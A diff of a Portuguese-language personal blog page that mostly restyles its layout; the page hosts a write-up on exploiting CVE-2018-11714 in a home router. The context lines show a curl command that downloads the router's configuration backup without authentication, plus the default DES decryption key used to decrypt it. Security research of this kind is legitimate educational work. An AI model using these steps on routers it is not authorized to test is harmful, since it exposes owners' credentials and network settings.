@@ -2,78 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>DevLog Terminal</title>
+  <title>N O U S</title>
   <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      background-color: black;
-      color: #00ffcc;
-      font-family: 'IBM Plex Mono', monospace;
-      font-size: 12px;
-    }
-
-    .container {
-      display: flex;
-      min-height: 100vh;
-    }
-
-    .sidebar {
-      width: 160px;
-      background-color: #111;
-      border-right: 2px solid #00ffcc;
-      padding: 10px;
-    }
-
-    .sidebar h2 {
-      font-size: 14px;
-      color: #00ffff;
-      margin-bottom: 8px;
-      border-bottom: 1px dashed #00ffcc;
-    }
-
-    .sidebar a {
-      display: block;
-      color: #00ffcc;
-      text-decoration: none;
-      margin: 6px 0;
-    }
-
-    .sidebar a:hover {
-      text-decoration: underline;
-    }
-
-    .content {
-      flex-grow: 1;
-      padding: 20px;
-    }
-
-    .log-box {
-      border: 1px dashed #00ffcc;
-      padding: 10px;
-      margin-bottom: 15px;
-      background-color: #000000;
-    }
-
-    .log-box h3 {
-      margin: 0 0 5px 0;
-      font-size: 13px;
-      color: #00ffff;
-    }
-
-    .code {
-  background: #111;
-  color: #33ff33;
-  font-family: 'IBM Plex Mono', monospace;
-  padding: 10px;
-  font-size: 12px;
-  border: 1px solid #444;
-  border-radius: 6px;
-  white-space: pre-wrap;
-  overflow-x: auto;
-  max-width: 100%;
-}
-  </style>
+  <link type="text/css" rel="stylesheet" href="./style.css"
 </head>
 <body>
   <div class="container">
@@ -91,15 +22,42 @@ o8o        `8   `Y8bood8P'     `YbodP'    8""88888P'
                                                                      
                                               
            </pre>
-      <h2>MENU</h2>
-      <a href="index.html">Home</a>
-      <a href="logs.html">Dev Log</a>
-      <a href="terminal.html">Terminal</a>
-      <a href="#">Downloads</a>
-      <a href="#">About</a>
-    </div>
+           <h2></h2><div style="position: relative; width: 100%;">
+            <img src="/img/wired.gif" style="width: 100%; display: block;" />
+            <div style="
+              position: absolute;
+              top: 0; left: 0;
+              width: 100%;
+              height: 100%;
+              background-color: rgba(0, 132, 255, 0.3); /* roxo com transparência */
+              mix-blend-mode: screen; /* ou 'multiply', veja qual fica melhor */
+              pointer-events: none;">
+            </div>
+          </div>
+          
+    
+                <h2></h2>
+          <a href="index.html" style="display: inline-flex; align-items: center; gap: 5px;">
+            <img class="custom-icon" src="/img/computer.png" alt="Home" style="height: 20px;" />
+            Home
+          </a><br>
+    
+          <a href="logs.html" style="display: inline-flex; align-items: center; gap: 5px;">
+            <img class="custom-icon" src="/img/note.png" alt="Home" style="height: 20px;" />
+            Dev Log
+          </a><br>  
+            <a href="terminal.html" style="display: inline-flex; align-items: center; gap: 5px;">
+                <img class="custom-icon" src="/img/movie.png" alt="Home" style="height: 20px;" />
+                Terminal
+              </a><br>
+          <a href="#" style="display: inline-flex; align-items: center; gap: 5px;">
+                <img class="custom-icon" src="/img/help_book_cool-4.png" alt="Home" style="height: 20px;" />
+                About
+              </a>
+        </div>
     <div class="content">
-      <div class="log-box">
+      <div class="log-box" >
+        <img src="/img/router.gif" alt="Logo" style="width: 80px; height: auto;" />
         <h3>CVE-2018-11714. explorando vulnerabilidade em roteador</h3>
 
         📝 <b>Nota:</b> Este artigo tem fins puramente educacionais. Todos os testes foram realizados em equipamentos pessoais e com autorização. Nunca realize varreduras, extrações ou testes de segurança sem permissão explícita do proprietário.<br><br>
@@ -184,7 +142,8 @@ Nmap done: 1 IP address (1 host up) scanned in 35.43 seconds
             
             Ele meio que consegue recuperar um arquivo de backup e descriptografá-lo. A descriptografia  
             não é muito boa, mas é possível tirar informações vantajosas! então let’s go :D
-
+           </p>
+            <img src="/img/matrixmen.gif" alt="Logo" style="width: 80px; height: auto;" />
             <pre class="code"><code>
 C:\Users\PC\Desktop\s\attack
 > curl -i -s -k -X GET -H 'Referer: http://192.168.3.26/mainFrame.htm' http://192.168.3.26/cgi/conf.bin > conf.bin
@@ -241,7 +200,9 @@ Er=S,XK▲�"�����u lc6�����9f*�e��☺�{�Y��d
           Com isso feito, tudo que falta é descriptografar o arquivo. O arquivo, pelas informações, está criptografado  
           em OpenSSL --> DES-ECB com o offset do dado em 144 bytes pra frente. E tem o pessoal que fez a engenharia reversa  
           no roteador que descobriu a chave de descriptografia padrão, que é: `478DA50BF9E3D2CF` (hex).  
-          E com essas informações em mãos, bora descriptografar!! e.e
+          E com essas informações em mãos, bora descriptografar!! e.e<p>
+
+          <img src="/img/hackinginprogress.gif" alt="Logo" style="width: 180px; height: auto;" />
 
           <pre class="code"><code>
 import requests, subprocess
